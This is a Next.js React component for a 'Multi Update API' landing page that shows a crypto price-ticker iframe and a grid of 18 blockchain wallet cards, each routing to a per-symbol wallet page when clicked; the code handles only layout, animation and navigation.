/* eslint-disable @typescript-eslint/no-explicit-any */
"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { ChevronDown } from "lucide-react"
import { useRouter } from "next/navigation"
import { useEffect, useRef, useState } from "react"
import Image from "next/image"
import bitcoinIcon from "@/assets/images/bitcoin.webp"
import ethIcon from "@/assets/images/eth.jpg"
import solanaIcon from "@/assets/images/solana.jpg"
import xrpIcon from "@/assets/images/xrp.jpg"
import cardanoIcon from "@/assets/images/cardano.jpg"
import aptosIcon from "@/assets/images/aptos.jpg"
import polkadotIcon from "@/assets/images/polkadot.png"
import cronosIcon from "@/assets/images/cronos.jpg"
import tonIcon from "@/assets/images/ton.png"
import venomIcon from "@/assets/images/venom.jpg"
import suiIcon from "@/assets/images/sui.webp"
import radixIcon from "@/assets/images/radix.png"
import roninIcon from "@/assets/images/ronin.png"
import runeIcon from "@/assets/images/rune.webp"
import hederaIcon from "@/assets/images/hedera.jpg"
import flareIcon from "@/assets/images/flare.png"
import keplrIcon from "@/assets/images/keplr.png"
import otherIcon from "@/assets/images/plus.jpg"


interface CardData {
  icon: string;
  title: string;
  description: string;
  symbol: string;
}

export default function Component() {
  const router = useRouter()
  const [visibleCards, setVisibleCards] = useState(new Set(Array.from({length: 18}, (_, i) => i)))
  const cardRefs = useRef<(HTMLDivElement | null)[]>([])
  const [isClient, setIsClient] = useState(false)

  // Get the appropriate icon for each symbol
  const getIcon = (symbol: string) => {
    const icons: { [key: string]: any } = {
      BTC: bitcoinIcon,
      ETH: ethIcon,
      SOL: solanaIcon,
      XRP: xrpIcon,
      ADA: cardanoIcon,
      APT: aptosIcon,
      DOT: polkadotIcon,
      CRO: cronosIcon,
      TON: tonIcon,
      VENOM: venomIcon,
      SUI: suiIcon,
      XRD: radixIcon,
      RUNE: runeIcon,
      RON: roninIcon,
      HBAR: hederaIcon,
      FLR: flareIcon,
      KPLR: keplrIcon,
      OTHER: otherIcon
    };
    return icons[symbol] || null;
  }

  // Blockchain-specific colors for symbols
  const getSymbolColor = (symbol: string): string => {
    const colors: { [key: string]: string } = {
      BTC: "bg-orange-500 hover:bg-orange-600",
      ETH: "bg-blue-500 hover:bg-blue-600", 
      SOL: "bg-purple-500 hover:bg-purple-600",
      XRP: "bg-blue-400 hover:bg-blue-500",
      ADA: "bg-blue-600 hover:bg-blue-700",
      APT: "bg-green-500 hover:bg-green-600",
      DOT: "bg-pink-500 hover:bg-pink-600",
      CRO: "bg-blue-700 hover:bg-blue-800",
      TON: "bg-blue-500 hover:bg-blue-600",
      VENOM: "bg-green-600 hover:bg-green-700",
      SUI: "bg-cyan-500 hover:bg-cyan-600",
      XRD: "bg-red-500 hover:bg-red-600",
      RON: "bg-blue-600 hover:bg-blue-700",
      RUNE: "bg-green-500 hover:bg-green-600",
      HBAR: "bg-purple-600 hover:bg-purple-700",
      FLR: "bg-red-500 hover:bg-red-600",
      KPLR: "bg-purple-500 hover:bg-purple-600",
      OTHER: "bg-gray-500 hover:bg-gray-600"
    };
    return colors[symbol] || "bg-gray-500 hover:bg-gray-600";
  }

  const cardData = [
    {
      icon: "an image imported with next/image from assets folder",
      title: "Bitcoin Wallet",
      description: "Bitcoin Blockchain Wallet",
      symbol: "BTC",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Ethereum Wallet",
      description:
        "Ethereum Virtual Machine Compatible Wallet",
      symbol: "ETH",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Solana Wallet",
      description:
        "Solana Blockchain Wallet",
      symbol: "SOL",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "XRP Wallet",
      description: "XRP Ledger Wallet",
      symbol: "XRP",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Cardano Wallet",
      description: "Cardano Blockchain Wallet",
      symbol: "ADA",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Aptos Wallet",
      description: "Aptos Blockchain Wallet",
      symbol: "APT",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Polkadot Wallet",
      description: "Polkadot Ecosystem Wallet",
      symbol: "DOT",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Cronos Wallet",
      description: "Cronos Chain Wallet",
      symbol: "CRO",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Ton Wallet",
      description: "The Open Network Wallet",
      symbol: "TON",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Venom Wallet",
      description: "Venom Blockchain Wallet",
      symbol: "VENOM",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Sui Wallet",
      description: "Sui Blockchain Wallet",
      symbol: "SUI",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Radix Wallet",
      description: "Radix DLT Wallet",
      symbol: "XRD",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Ronin Wallet",
      description: "Ronin Sidechain Wallet",
      symbol: "RON",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Rune Wallet",
      description: "THORchain Rune Wallet",
      symbol: "RUNE",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Hedera Wallet",
      description: "Hedera Hashgraph Wallet",
      symbol: "HBAR",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Flare Wallet",
      description: "Flare Network Wallet",
      symbol: "FLR",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Keplr Wallet",
      description: "Cosmos Ecosystem Wallet",
      symbol: "KPLR",
    },
    {
      icon: "an image imported with next/image from assets folder",
      title: "Other Wallets",
      description: "Additional Wallets Support",
      symbol: "OTHER",
    },
  ]

  useEffect(() => {
    setIsClient(true)

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            const index = Number.parseInt(entry.target.getAttribute("data-index") || "0")
            setVisibleCards((prev) => new Set([...prev, index]))
          }
        })
      },
      { threshold: 0.1, rootMargin: "50px" }
    )

    cardRefs.current.forEach((ref) => {
      if (ref) observer.observe(ref)
    })

    return () => observer.disconnect()
  }, [])

  if (!isClient) return null
  
  const handleCardClick = (card: CardData, index: number) => {
    const symbol = cardData[index].symbol
    const network = cardData[index].title
    router.push(`/wallet/${symbol.toLowerCase()}?network=${encodeURIComponent(network)}`)
  }

  return (
    <div className="min-h-screen bg-darkBlueCustom relative overflow-hidden">
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-20">
        <svg className="w-full h-full" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg">
          <path d="M100,500 Q300,200 500,500 T900,500" stroke="rgba(255,255,255,0.1)" strokeWidth="2" fill="none" />
          <path d="M0,300 Q200,100 400,300 T800,300" stroke="rgba(255,255,255,0.1)" strokeWidth="1" fill="none" />
          <circle cx="100" cy="200" r="3" fill="rgba(255,255,255,0.3)" />
          <circle cx="900" cy="300" r="2" fill="rgba(255,255,255,0.2)" />
          <circle cx="800" cy="700" r="4" fill="rgba(255,255,255,0.1)" />
        </svg>
      </div>

      {/* Crypto Ticker */}
      <div
        className="bg-black/30 backdrop-blur-sm border-b border-white/10"
        style={{ height: "40px", padding: 0, margin: 0, width: "100%" }}
      >
        <iframe
          src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no"
          width="100%"
          height="36px"
          scrolling="auto"
          marginWidth={0}
          marginHeight={0}
          frameBorder="0"
          style={{ border: 0, margin: 0, padding: 0 }}
          title="Cryptocurrency Price Ticker"
        />
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-16">
        <div className="text-center mb-16">
        <h1 className="text-5xl font-bold text-white">           
            Multi Update API
        </h1><br></br>

          <p className="text-gray-100 text-6xl md:text-lg max-w-2xl mx-auto mb-6 leading-relaxed">
          Connect to multiple blockchain networks and manage your crypto assets securely
          </p>

          <div className="flex flex-col sm:flex-row gap-4 justify-center items-center mb-16">
            
          </div>

          <h2 className="text-1xl text-white mb-12">Select Wallet Type</h2>
        </div>

        {/* Cards Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-6xl mx-auto">
          {cardData.map((card, index) => (
            <div
              key={index}
              ref={(el) => {
                cardRefs.current[index] = el
              }}
              data-index={index}
              className={`transform transition-all duration-700 ease-out ${
                visibleCards.has(index) ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"
              }`}
              style={{ transitionDelay: `${(index % 4) * 100}ms` }}
            >
              <Card
                className="bg-black/20 backdrop-blur-sm border-white/10 hover:bg-gradient-to-br hover:from-purple-600/20 hover:to-purple-800/20 transition-all duration-300 cursor-pointer group"
                onClick={() => handleCardClick(card, index)}
              >
                <CardContent className="p-6">
                  <div className="flex items-center gap-4">
                    {/* Icon on the left */}
                    <div className="flex-shrink-0">
                      {getIcon(card.symbol) ? (
                        <Image 
                          src={getIcon(card.symbol)}
                          alt={card.title}
                          width={64}
                          height={64}
                          className="rounded"
                        />
                      ) : (
                        /* Placeholder for blockchain icons without downloaded images */
                        <div className="w-16 h-16 bg-white/10 rounded-lg flex items-center justify-center">
                          <div className="w-12 h-12 bg-white/20 rounded"></div>
                        </div>
                      )}
                    </div>
                    
                    {/* Centralized content */}
                    <div className="flex-1 text-center">
                      <h3 className="text-2xl font-semibold text-white mb-3 group-hover:text-purple-200 transition-colors">
                        {card.title}
                      </h3>
                      <p className="text-gray-300 text-base leading-relaxed group-hover:text-gray-200 transition-colors mb-4">
                        {card.description}
                      </p>
                      
                      {/* Symbol as styled button */}
                      <div className="flex justify-center">
                        <span className={`px-5 py-2 rounded-full text-white text-base font-semibold transition-colors ${getSymbolColor(card.symbol)}`}>
                          {card.symbol}
                        </span>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}
